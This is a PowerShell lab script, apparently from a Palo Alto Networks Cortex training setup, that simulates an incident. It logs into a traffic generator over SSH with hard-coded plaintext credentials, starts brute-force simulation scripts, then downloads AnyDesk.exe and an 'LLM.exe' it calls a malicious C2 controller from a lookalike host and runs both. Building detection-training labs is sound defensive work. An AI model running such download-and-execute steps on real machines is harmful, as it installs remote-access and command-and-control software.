# Copyright (c) 2024, Palo Alto Networks
#
# Permission to use, copy, modify, and/or distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

# Author: Richard Porter rporter@paloaltonetworks.com

# Call the custom Install-PoshSSH module, this is a backup function to make sure module installed
# If it is installed the function will detect and continue

#### Start Functions Section ####
# TODO: Document these better
# Function to remove file if it exists
function Remove-FileIfExists {
    param (
        [Parameter(Mandatory = $true)]
        [string]$filename
    )

    # Check if the file exists
    if (Test-Path -Path $filename) {
        # Remove the file
        Remove-Item -Path $filename -Force
        Write-Log "File '$filename' existed and was deleted."
        Write-Host "File '$filename' existed and was deleted."
    } else {
        Write-Log "File '$filename' does not exist."
        Write-Host "File '$filename' does not exist."
    }
}

function Get-Analyst-File ($url, $outputPath) {
    Invoke-WebRequest -Uri $url -OutFile $outputPath
    Write-Log "Downloaded $url to $outputPath"
}

# Function to execute a file
function Start-Analyst-File ($filePath) {
    Start-Process -FilePath $filePath
    Write-Log "Executed $filePath"
}



function Get-LabIPAddress {
    [CmdletBinding()]
    param (
        [string]$LabBuildFile = "$env:USERPROFILE\Desktop\lab_build.txt"
    )

    # Check if the file exists
    if (-not (Test-Path -Path $LabBuildFile)) {
        Write-Log "The file '$LabBuildFile' does not exist."
        return $null
    }

    # Read the contents of the lab_build.txt file
    $labBuildContent = Get-Content -Path $LabBuildFile

    # Initialize variable for IP address
    $ipAddress = $null

    # Loop through each line to find the one that starts with 'ip:'
    foreach ($line in $labBuildContent) {
        if ($line -match '^ip:\s*(.*)$') {
            # Extract the IP address by removing 'ip:' and any leading/trailing whitespace
            $ipAddress = $line -replace '^ip:\s*', ''
            $ipAddress = $ipAddress.Trim()
            Write-Log "IP found in $labBuildFile and extracted as $ipAddress"
            Write-Host "IP found in $labBuildFile and extracted as $ipAddress"
            break
        }
    }

    # Check if IP address was found
    if (-not $ipAddress) {
        Write-Log "IP address not found in '$LabBuildFile'."
        return $null
    }

    # Return the IP address
    return $ipAddress
}

function Install-PoshSSH {
    [CmdletBinding()]
    param ()

    # Create a script block to install Posh-SSH as Administrator
    $scriptBlock = {
        # Set the execution policy to RemoteSigned
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Force

        # Install the Posh-SSH module
        Install-Module -Name Posh-SSH -Force -AllowClobber

        # Import the Posh-SSH module
        Import-Module Posh-SSH

        Write-Log "Posh-SSH has been installed and imported successfully."
    }

    # Convert the script block to a string
    $scriptBlockString = $scriptBlock.ToString()

    # Escape the double quotes in the script block string
    $escapedScriptBlock = $scriptBlockString -replace '"', '\"'

    # Start a new PowerShell process as Administrator
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `" & {$escapedScriptBlock} `" " -Verb RunAs
}
function Write-Log {
    param (
        [string]$Message,
        [string]$LogFile = "$env:USERPROFILE\Downloads\lab_build.log"
    )
    $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogMessage = "$TimeStamp - $Message"
    Add-Content -Path $LogFile -Value $LogMessage
}

function Get-LabIncidentCommands {
    [CmdletBinding()]
    param (
        [string]$FilePath = "$Env:USERPROFILE\Desktop\lab-incident-command.txt"
    )

    # Check if the file exists
    if (!(Test-Path -Path $FilePath)) {
        Write-Error "The file '$FilePath' does not exist."
        return $null
    }

    try {
        # Read the contents of the file into an array
        $commands = Get-Content -Path $FilePath -ErrorAction Stop

        # Ensure $commands is always an array
        if (-not ($commands -is [System.Array])) {
            $commands = @($commands)
        }

        return $commands
    } catch {
        Write-Error "An error occurred while reading the file: $_"
        return $null
    }
}
function Start-ElevatedProcess {
    param (
        [string]$FilePath,
        [string]$Arguments
    )
    Start-Process -FilePath $FilePath -ArgumentList $Arguments -Verb RunAs
}

function Install-WindowsAgent {
    [CmdletBinding()]
    param ()

    # Define the path to the MSI file
    $msiPath = Join-Path -Path "$env:USERPROFILE\Downloads" -ChildPath "Windows_Agent_x64.msi"

    # Check if the MSI file exists
    if (-not (Test-Path -Path $msiPath)) {
        Write-Log "MSI file not found at $msiPath."
        return
    }

    Write-Log "Installing Windows Agent from $msiPath..."

    # Build the msiexec arguments for silent installation
    $arguments = "/i `"$msiPath`" /quiet /qn /norestart"

    # Start msiexec.exe as administrator
    Start-ElevatedProcess -FilePath "msiexec.exe" -Arguments $arguments

    Write-Log "Windows Agent has been installed silently."
}

function Wait-Time {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [int]$minwait,
        [Parameter(Mandatory=$true, Position=1)]
        [int]$maxwait
    )
    # Generate a random time interval between what was passed, in seconds
    $waitTime = Get-Random -Minimum $minwait -Maximum $maxwait

    # Start the wait process
    Start-Sleep -Seconds $waitTime

    # log the wait time
    Write-Log "waited $waitTime in seconds"
    Write-Host "waited $waitTime in seconds"
}

# Not required for Lab Incidents Run
#Install-PoshSSH

#Start-Sleep -Seconds 30
# Import the Posh-SSH module
# Need this or the whole thing breaks

Import-Module Posh-SSH
Write-Host "Imported Posh-SSH"
# These are set based on download from the tenant
# TODO: Automate Download and detect version from Ansible

#$agent = "Linux_Agent_sh.tar.gz"
#$collector = "Linux_Collector_sh.tar.gz"
$home_directory = "/home/cortex"
Write-Host "Setting Home Directory to $home_directory"
#$windows_agent = "Windows_Agent_x64.msi"
# This gets the lab incident command from the text file on the desktop
# if the command ever changes, it will pick it up
# if additional commands are added by line, it will execute those
$lab_incident = Get-LabIncidentCommands
Write-Host "Getting the Lab incident command $lab_incident"


# Define the IP address and credentials
# This gets the IP Address of the Traffic Generator from the lab_build.txt file.
# it looks for the IP: and strips the IP:, if this is changed, the script breaks

$ipAddress = Get-LabIPAddress
Write-Host "Found Traffic Generator IP Address $ipAddress"

# Hard Coded credentials for Traffic Generator
# THIS IS A LAB, DO NOT DO THIS IN PRODUCTION
# TODO: Update to Keys
$username = "cortex"
$password = "password"  # Plain text password
Write-Host "Setting Traffic Generator user and password. User: $username, Password: $password"
Write-Host "WARNING: This is a lab, never do this in production. Oh the irony...."

# Convert password to SecureString
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force

# This installs the agent on the local windows device
# This assumes the file has been downloaded (no automation yet)
# This assumes the filename is correct, that is static
# If filename is not Windows_Agent_x64.msi install will fail
# TODO: Make more dynamic
# TODO: Automate API based download where Ansible supplies key
# runas /user:Administrator "msiexec /i $env:USERPROFILE\Downloads\$windows_agent /quiet /qn /norestart"
#Install-WindowsAgent

# Start SSH Session with Traffic Generator, again lab_build.txt must be there with IP: prefixed line in text file, or this all breaks
# This is SSH session only. This accepts the new key automatically, this is for compat reasons on build
$session = New-SSHSession -ComputerName $ipAddress -Credential (New-Object System.Management.Automation.PSCredential($username, $securePassword)) -AcceptKey
Write-Host "Created SSH Session $session"
# Start SFTP Session with Traffic Generator, again lab_build.txt must be there with IP: prefixed line in text file, or this all breaks
# This is SFTP session only.
#$session_sftp = New-SFTPSession -ComputerName $ipAddress -Credential (New-Object System.Management.Automation.PSCredential($username, $securePassword)) -AcceptKey

# Create a shell stream for SSH Session to stream commands
$stream = $session.Session.CreateShellStream("PS-SSH", 0, 0, 0, 0, 1000)

# Here we copy the $agent binary and the $collector binary for linux to Traffic Gen
# TODO: Automate binary and conf distribution using --dist-id in conf vs unpack
#Set-SFTPItem -SessionId $session_sftp.SessionId -Destination $home_directory -Path $env:USERPROFILE\Downloads\$agent
#Set-SFTPItem -SessionId $session_sftp.SessionId -Destination $home_directory -Path $env:USERPROFILE\Downloads\$collector

# Begin command sequece setting up the lab, first elevate to root.
Invoke-SSHStreamExpectSecureAction -ShellStream $stream -Command "sudo -s" -ExpectString "password for ${username}:" -SecureAction $securePassword
Write-Host "Set priveleges to sudo -s"
# Unpacks the Agent
#Invoke-SSHStreamShellCommand -ShellStream $stream -Command "tar xvf $home_directory/$agent"
#Start-Sleep -Seconds 2

# Unpacks the collector
#Invoke-SSHStreamShellCommand -ShellStream $stream -Command "tar xvf $home_directory/$collector"
#Start-Sleep -Seconds 2

# Make Agent installer executable
#Invoke-SSHStreamShellCommand -ShellStream $stream -Command "chmod +x $home_directory/cortex-*.sh"

# Make Collector installer executable
#Invoke-SSHStreamShellCommand -ShellStream $stream -Command "chmod +x $home_directory/collector-*.sh"

# Create the conf directory under /etc/panw
#Invoke-SSHStreamShellCommand -ShellStream $stream -Command "sudo mkdir -p /etc/panw"

# Copy conf files to /etc/panw, this is needed or agent installs fail to pick up proper tenant
#Invoke-SSHStreamShellCommand -ShellStream $stream -Command "sudo cp $home_directory/collector.conf /etc/panw"
#Invoke-SSHStreamShellCommand -ShellStream $stream -Command "sudo cp $home_directory/cortex.conf /etc/panw"

# Install the collector and wait 2 min for collector to check in
#Invoke-SSHStreamShellCommand -ShellStream $stream -Command "$home_directory/collector-*.sh"
#Start-Sleep -Seconds 120

# Install the agent and wait 2 minutes for agent to check in
#Invoke-SSHStreamShellCommand -ShellStream $stream -Command "$home_directory/cortex-*.sh"
#Start-Sleep -Seconds 120

# Start the ssh_simulator simulating brute force
$remoteCommand = "nohup /usr/bin/python3 $home_directory/ssh_simulator.py > /dev/null 2>&1 &"
Write-Host "Running command: $remoteCommand"
$result = Invoke-SSHCommand -Command $remoteCommand -SessionId $session.SessionId 
if ($result.ExitStatus -eq 0) {
    Write-Log "$remoteCommand run successfully."
    Write-Host "$remoteComamnd run successfully."
} else {
    Write-Log "Error starting $remoteCommand."
    Write-Host "Error"
    Write-Log $result.Error
    Write-Host $result.Error
    Write-Host "Suggest rerunning script."
}
$remoteCommand = "nohup /usr/bin/python3 $home_directory/data_simulation.py > /dev/null 2>&1 &"
Write-Host "Running command: $remoteCommand"
$result = Invoke-SSHCommand -Command $remoteCommand -SessionId $session.SessionId
if ($result.ExitStatus -eq 0) {
    Write-Log "$remoteCommand run successfully."
    Write-Host "$remoteComamnd run successfully."
} else {
    Write-Log "Error starting $remoteCommand."
    Write-Host "Error"
    Write-Log $result.Error
    Write-Host $result.Error
    Write-Host "Suggest rerunning script."
}

$remoteCommand = "nohup $lab_incident > /dev/null 2>&1 &"
Write-Host "Running command: $remoteCommand"
$result = Invoke-SSHCommand -Command $remoteCommand -SessionId $session.SessionId -TimeOut 300000
if ($result.ExitStatus -eq 0) {
    Write-Log "$remoteCommand run successfully."
    Write-Host "$remoteComamnd run successfully."
} else {
    Write-Log "Error starting $remoteCommand."
    Write-Host "Error"
    Write-Log $result.Error
    Write-Host $result.Error
    Write-Host "Suggest rerunning script."
}


# Wait for a random period between 10 - 15 seconds
Write-Host "Introducing a random wait period for better simulation."
Wait-Time -minwait 10 -maxwait 15
# Define URLs
$anyDeskUrl = "http://dl.steanpowered.ru/AnyDesk.exe"
$llmUrl = "http://dl.steanpowered.ru/LLM.exe"

Write-Log "Created var: $anyDeskUrl and var: $llmUrl"
Write-Host "Created var: $anyDeskUrl and var: $llmUrl"

# Define download paths
$downloadsPath = "$env:USERPROFILE\Downloads"
$anyDeskPath = Join-Path -Path $downloadsPath -ChildPath "AnyDesk.exe"
$llmPath = Join-Path -Path $downloadsPath -ChildPath "LLM.exe"


# Remove AnyDesk.exe if it exists
Remove-FileIfExists -filename $anyDeskPath

# Download AnyDesk.exe
Get-Analyst-File -url $anyDeskUrl -outputPath $anyDeskPath
Write-Host "Simulated user downloading AnyDesk.exe from the web."
Write-Log "Simulated user downloading AnyDesk.exe from the web."
# Wait from 12 to 22 seconds
Write-Host "Introducing a random wait period for better simulation."
Wait-Time -minwait 12 -maxwait 22

# Remove LLM.exe if it exists
Remove-FileIfExists -filename $llmPath

# Wait from 12 to 22 seconds
Write-Host "Introducing a random wait period for better simulation."
Wait-Time -minwait 12 -maxwait 22
# Execute AnyDesk.exe
Start-Analyst-File -filePath $anyDeskPath
Write-Host "Simulating user starting AnyDesk.exe"

# Wait for a random period between 10 - 15 seconds
Write-Host "Introducing a random wait period for better simulation."
Wait-Time -minwait 10 -maxwait 15

# Getting bad stuff
Get-Analyst-File -url $llmUrl -outputPath $llmPath
Write-Host "Getting the bad stuff (LLM.exe)"
Write-Log "Retrieved LLM.exe"

# Wait for a random period between 10 - 15 seconds
Write-Host "Introducing a random wait period for better simulation."
Wait-Time -minwait 10 -maxwait 15
# Execute LLM.exe
Start-Analyst-File -filePath $llmPath
Write-Host "Started malicous C2 Controller LLM.exe"
Write-Log "Started bad file (LLM.exe)"
Write-Log "Script execution complete."